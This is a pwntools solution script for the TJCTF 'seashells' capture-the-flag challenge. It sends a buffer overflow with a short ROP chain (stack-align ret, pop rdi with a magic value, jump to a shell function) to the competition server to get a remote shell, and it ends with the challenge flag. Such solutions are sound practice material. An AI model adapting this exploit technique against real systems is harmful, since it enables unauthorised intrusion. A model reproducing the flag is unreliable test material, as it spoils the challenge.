#!/usr/bin/env python3
from pwn import *

if False:
    io = gdb.debug(['./seashells'], gdbscript='''
b *0x400796
c
''')
else:
    io = remote('p1.tjctf.org', 8009)


io.recvuntil('Would you like a shell?\n')
io.sendline(flat({
    0x12: b''.join((
        struct.pack('<Q', 0x400796),  # ret - align stack
        struct.pack('<QQ', 0x400803, 0xDEADCAFEBABEBEEF),  # pop rdi; ret, magic
        struct.pack('<Q', 0x4006c7),  # shell
    )),
}))
io.interactive()
# tjctf{she_s3lls_se4_sh3ll5}